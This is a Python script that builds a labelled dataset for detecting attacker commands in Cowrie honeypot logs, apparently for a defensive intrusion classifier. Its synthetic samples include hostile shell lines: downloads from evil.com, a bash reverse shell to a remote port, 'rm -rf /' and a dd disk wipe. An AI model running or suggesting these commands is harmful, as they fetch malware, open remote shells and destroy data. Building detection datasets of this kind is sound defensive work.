import json
import numpy as np
import os
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer


LABEL_MAP = {
    "Benign": 0,
    "Reconnaissance": 1,
    "Malware_Download": 2,
    "Stager/Dropper": 2,
    "Exploit_Attempt": 3,
    "Ransomware/Encryption": 4,
    "Data_Destruction": 4,
    "Advanced_APT_Malware": 5,
    "Logic_Bomb_Detonated": 5,
    "Obfuscated_Go_Binary": 5,
}

SYNTHETIC_DATA = {
    0: ["ls -la", "git status", "cd /var/www", "whoami", "pwd", "systemctl status nginx"],
    1: ["nmap -sV 127.0.0.1", "masscan 0.0.0.0/0", "zmap -p 80", "netstat -an"],
    2: ["wget http://evil.com/bot", "curl -O http://1.2.3.4/rat", "scp user@bad.com:/tmp/x ."],
    3: ["./exploit_cve_2024", "python3 exploit.py target", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"],
    4: ["rm -rf / --no-preserve-root", "dd if=/dev/zero of=/dev/sda", "openssl enc -aes-256-cbc"],
    5: ["./payload.bin Activate_Zorya_Protocol", "go run logic_bomb.go --silent", "chmod +x /tmp/svc; /tmp/svc --hide"],
}


def build_dataset(
    fusion_file,
    cowrie_file,
    output_dir,
    max_log_lines=150000,
    synthetic_multiplier=500,
):
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    ip_capability = {}
    if os.path.exists(fusion_file):
        with open(fusion_file, 'r') as f:
            data = json.load(f)
            for record in data:
                ip = record.get('session_ip')
                intent = record.get('inferred_intent')
                caps = record.get('capabilities', [])
                label = LABEL_MAP.get(intent, 0)
                if "Obfuscated_Go_Binary" in caps or "Advanced_APT_Malware" in caps:
                    label = 5
                if label > 0:
                    ip_capability[ip] = label

    corpus = []
    labels = []

    if os.path.exists(cowrie_file):
        with open(cowrie_file, 'r') as f:
            for i, line in enumerate(f):
                if i > max_log_lines:
                    break
                try:
                    entry = json.loads(line)
                    if entry.get('eventid') == 'cowrie.command.input':
                        cmd = entry.get('input')
                        ip = entry.get('src_ip')
                        label = ip_capability.get(ip, 0)
                        if cmd:
                            corpus.append(cmd)
                            labels.append(label)
                except Exception:
                    continue

    for label_id, commands in SYNTHETIC_DATA.items():
        for _ in range(synthetic_multiplier):
            for cmd in commands:
                corpus.append(cmd)
                labels.append(label_id)

    vectorizer = TfidfVectorizer(max_features=3000, analyzer='char_wb', ngram_range=(2, 5))
    X = vectorizer.fit_transform(corpus)
    y = np.array(labels)

    with open(os.path.join(output_dir, "X_deep_sparse.pkl"), 'wb') as f:
        pickle.dump(X, f)
    with open(os.path.join(output_dir, "y_deep.pkl"), 'wb') as f:
        pickle.dump(y, f)
    with open(os.path.join(output_dir, "vectorizer_deep.pkl"), 'wb') as f:
        pickle.dump(vectorizer, f)

    return {
        "samples": len(y),
        "shape": X.shape,
        "output_dir": output_dir,
    }
